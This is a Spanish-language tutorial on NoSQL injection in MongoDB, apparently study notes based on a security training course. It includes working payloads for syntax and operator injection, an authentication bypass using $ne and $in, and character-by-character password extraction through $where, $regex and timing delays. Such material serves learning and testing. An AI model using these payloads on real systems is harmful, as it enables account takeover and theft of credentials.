
---------
# Definición

>Una NoSQL Injection es una vulnerabilidad de seguridad que ocurre cuando una aplicación inserta datos no confiables directamente en una consulta a una base de datos NoSQL (como MongoDB), sin validarlos ni sanitizarlos correctamente, permitiendo a un atacante manipular esa consulta.

Es similar a una SQL Injection, pero en bases de datos NoSQL. El atacante introduce entradas maliciosas que alteran la lógica de la consulta.

--------
# NoSQL databases

Las bases de datos NoSQL guardan y devuelven datos en un formato distinto al de las tablas relacionales de SQL.

## NoSQL database models

- **Document stores** - Guardan la información en un documento en formato flexible y semiestructurado, como JSON, BSON, y XML.

	*MongoDB* y *Couchbase*

- **Key-value stores** - Guardan la información en formato clave-valor.

	*Redis* y *Amazon DynamoDB*

- **Wide-column stores** - Organizan los datos en familias de columnas flexibles en vez de en filas tradicionales.

	*Apache Cassandra* y *Apache HBase*

- **Graph databases** - Usan nodos para guardar entidades de datos, y aristas par guardar la relación entre las entidades.

	*Neo4j* y *Amazon Neptune*

----------
# NoSQL syntax injection

## Detecting syntax injection in MongoDB

Considerando la siguiente URL válida:

``` url
https://insecure-website.com/product/lookup?category=fizzy
```

La aplicación mandará una consulta JSON que devuelva los productos relevantes de la colección `product` de la base de datos MongoDB:

``` js
this.category == 'fizzy'
```

Para comprobar si es vulnerable, se envía un *fuzz string* en el valor del parámetro `category`:

``` js
'"`{
;$Foo}
$Foo \xYZ
```

*\*Nota*: Los saltos de línea y null bytes del fuzz string cuentan. El payload url-encoded es: `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`.

Se usaría de la siguiente manera:

``` url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Si esto produce un cambio con respecto a la respuesta original, entonces indica que el input no está siendo filtrado o sanitizado correctamente.

También es conveniente tener el payload en JSON:

``` json
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Determining which characters are processed

Inyectar caracteres individuales, como `'`. Si causa un cambio con respecto a la respuesta original, indica que el caracter ha roto la sintaxis de la consulta y ha causado un error de sintaxis.

Esto se puede confirmar enviando el mismo caracter, pero escapándolo:

``` js
this.category == '\''
```

Si en este caso no causa un error de sintaxis, entonces quiere decir que la aplicación es vulnerable a un ataque de inyección.

### Confirming conditional behavior

Enviar dos peticiones, cada una con una condición booleana, una falsa y otra verdadera. `' && 0 && 'x` y `' && 1 && 'x`.

``` url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

``` url
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Si la aplicación se comporta diferente, sugiere que la condición falsa impacta sobre la lógica de la consulta, mientras que la verdadera no. Esto indica que inyectar este estilo de sintaxis provoca una consulta del lado del servidor.

### Overriding existing conditions

Influenciar condiciones booleanas sobrescribiendo condiciones existentes para explotar la vulnerabilidad. Por ejemplo, se puede inyectar una condición Javascript que siempre se evalúe a true, como `'||'1'=='1`:

``` url
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Esto resulta en la consulta:

``` js
this.category == 'fizzy'||'1'=='1'
```

Como la condición es true, la consulta modificada devuelve todos los items.

*\*Warning*: Inyectar condiciones que siempre se evalúen a true *puede provocar pérdida de datos* si la aplicación utiliza los datos de una petición para múltiples consultas, entre las que se incluyan actualizar o borrar datos.

También se puede probar a añadir un *null byte*. MongoDB puede que ignore todos los caracteres después del caracter null, anulando posibles condiciones posteriores de la consulta.

Por ejemplo, en la siguiente consulta:

``` js
this.category == 'fizzy' && this.released == 1
```

La restricción `this.released == 1` se usa para solo mostrar los productos lanzados. Para productos que aún no han salido a la venta se asume `this.released == 0`.

En este caso, se puede construir este ataque:

``` url
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Esto resulta en la siguiente consulta:

``` js
this.category == 'fizzy'\u0000' && this.released == 1
```

Si MongoDB ignora los caracteres posteriores al caracter null, se elimina el requisito del campo released, mostrando así todos los productos de la categoría `frizzy`, tanto lanzados como no.

--------
# NoSQL operator injection

Las bases de datos NoSQL habitualmente utilizan operadores de consulta, que ofrecen maneras de especificar condiciones que los datos deben cumplir para poder ser incluidos en el resultado de la consulta.

Algunos operadores de MongoDB:

- `$where` - Hace match con documentos que satisfacen cierta expresión JavaScript.
- `$ne` - Hace match con todos los valores que sean diferentes al valor especificado.
- `$in` - Hace match con todos los valores especificados en el array.
- `$regex` - Selecciona documentos donde los valores hacen match con la expresión regular especificada.

Puede ser posible inyectar operadores de consulta para manipular consultas NoSQL.

## Submitting query operators

En mensajes JSON, los operadores de consulta se insertan como objetos anidados:

``` json
{
	"username": {
		"$ne": "invalid"
	}
}
```

En inputs basados en URL, se insertan los operadores a través de parametros URL:

``` url
username[$ne]=invalid
```

Si el parámetro en la URL no funciona, probar lo siguiente:

1. Convertir la petición de GET a POST.
2. Cambiar el `Content-Type` a `application/json`.
3. Añadir el JSON al cuerpo del mensaje.
4. Inyectar el operador de consulta en el JSON.

## Detecting operator injection in MongoDB

Considerando una aplicación vulnerable que acepta usuario y contraseña en el cuerpo de una petición POST:

``` json
{
	"username": "wiener",
	"password": "peter"
}
```

Probar cada input con un rango de operadores. Por ejemplo, para probar si el input username procesa los operadores de consulta, se puede probar a inyectar:

``` json
{
	"username": {
		"$ne": "invalid"
	},
	"password": "peter"
}
```

Si el operador `$ne` se aplica, la consulta devolverá todos los usuarios que no se llamen `invalid` y que tengan como contraseña `peter`.

Puede ser posible bypassear completamente la autenticación utilizando el siguiente payload:

``` json
{
	"username": {
		"$ne": "invalid"
	},
	"password": {
		"$ne": "invalid"
	}
}
```

donde se iniciará sesión con el primer usuario de la colección devuelta.

Para apuntar a una cuenta concreta, se puede construir un payload que incluya nombres de usuario conocidos, o un usuario que se conozca:

``` json
{
	"username": {
		"$in": [
			"admin",
			"administrator",
			"superadmin"
		]
	},
	"password": {
		"$ne": ""
	}
}
```

--------
# Exploiting syntax injection to extract data

## Exfiltrating data in MongoDB

Considerando una aplicación vulnerable que permite a los usuarios buscar otros usuarios registrados y mostrar sus roles. Esto lanza la siguiente petición URL:

``` url
https://insecure-website.com/user/lookup?username=admin
```

Esto resulta en la siguiente consulta NoSQL de la colección `users`:

``` js
{"$where":"this.username == 'admin'"}
```

Se puede tratar de inyectar funciones JavaScript que devuelvan datos sensibles. Por ejemplo:

``` js
admin' && this.password[0] == 'a' || 'a'=='b
```

Esto permite extraer la contraseña caracter por caracter.

También se puede utilizar la función `match()` para extraer información. Por ejemplo:

``` js
admin' && this.password.match(/\d/) || 'a'=='b
```

### Identifying field names

Como MongoDB trata datos semiestructurados que no requieren un esquema fijo, es necesario identificar los campos de la colección antes de extraer datos usando inyección de JavaScript.

Se manda un payload con el campo que se quiere probar. Por ejemplo un campo `password`:

``` url
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Después se vuelve a introducir un payload con un campo existente, como puede ser `username`, y otro para uno que no exista, como `foo`:

``` js
admin' && this.username!='
```

``` js
admin' && this.foo!='
```

Si el campo `password` existe, la respuesta será idéntica a la del campo `username`. Si no existe, la respuesta será igual que la de `foo`.

*\*Nota*: Se puede utilizar inyección de operadores NoSQL para extraer los nombres de los campos caracter por caracter, sin tener que adivinar campos o realizar un ataque de diccionario.

------
# Exploiting NoSQL operator injection to extract data

## Injecting operators in MongoDB

Considerando una aplicación vulerable que acepta:

``` json
{
	"username": "wiener",
	"password": "peter"
}
```

Intentar inyectar el operador `$where`, con condición evaluada a falso y otra a cierto:

``` json
{
	"username": "wiener",
	"password": "peter",
	"$where": "0"
}
```

``` json
{
	"username": "wiener",
	"password": "peter",
	"$where": "1"
}
```

Si hay una diferencia en las respuestas quiere decir que la expresión JavaScript se está evaluando.

### Extracting field names

Utilizando el método `keys()`:

``` json
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

Iterar por:
- Posición: `{0}`
- Caracter: `a`

### Exfiltrating data using operators

Utilizando `$regex` para extraer datos caracter por caracter.

Considerando:

``` json
{
	"username": "wiener",
	"password": "peter"
}
```

Introducir el operador:

``` json
{
	"username": "wiener",
	"password": {
		"$regex": "^.*"
	}
}
```

Si la respuesta es diferente con respecto a la petición con una contraseña incorrecta, entonces es vulnerable.

Para extraer información:

``` json
{
	"username": "wiener",
	"password": {
		"$regex": "^a*"
	}
}
```

--------
# Timing based injection

En casos donde no es posible provocar un error en la base de datos. Detectar la vulnerabilidad inyectando un retraso temporal condicional.

1- Cargar la página varias veces para determinar el tiempo de carga medio.

2- Insertar un payload basado en tiempo. Por ejemplo, `{"$where": "sleep(5000)"}`.

3- Identificar si la respuesta se ha cargado más lento. Esto indica que la inyección ha sido exitosa.

Para explotarlo caracter por caracter, se pueden utilizar los siguientes payloads:

``` js
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

``` js
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```